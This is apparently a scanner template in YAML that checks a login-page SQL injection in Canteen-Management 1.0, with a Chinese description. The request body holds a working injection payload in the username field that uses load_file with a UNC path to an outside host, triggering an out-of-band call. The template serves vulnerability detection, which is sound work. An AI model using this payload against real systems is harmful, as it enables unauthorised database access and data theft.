id: Canteen-Management-1.0-2022-SQLi

info:
  name: Canteen-Management-1.0-2022 - SQLi
  author: nu11secur1ty
  severity: critical
  description: Canteen-Management1.0-2022 的用户名参数似乎容易受到 SQL 注入攻击。恶意用户可以利用该漏洞远程攻击本系统，窃取本系统数据库中的所有信息。
  reference:
    - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/mayuri_k/2022/Canteen-Management/SQLi

set:
  hosturl: request.url
rules:
  r0:
    request:
      method: POST
      path: /login.php
      body: |
        username=UvIiDwEB'+(select load_file('\\\\dp63gurp7hq1sbs2l0zhxwq2yt4msdn1e42wpmdb.tupaciganka.com\\gfa'))+'' OR NOT 6549=6549 AND 'gzCy'='gzCy&password=h5F!l8j!Y6&login=
    expression: response.body.bcontains(b'dp63gurp7hq1sbs2l0zhxwq2yt4msdn1e42wpmdb.tupaciganka.com')
expression: r0()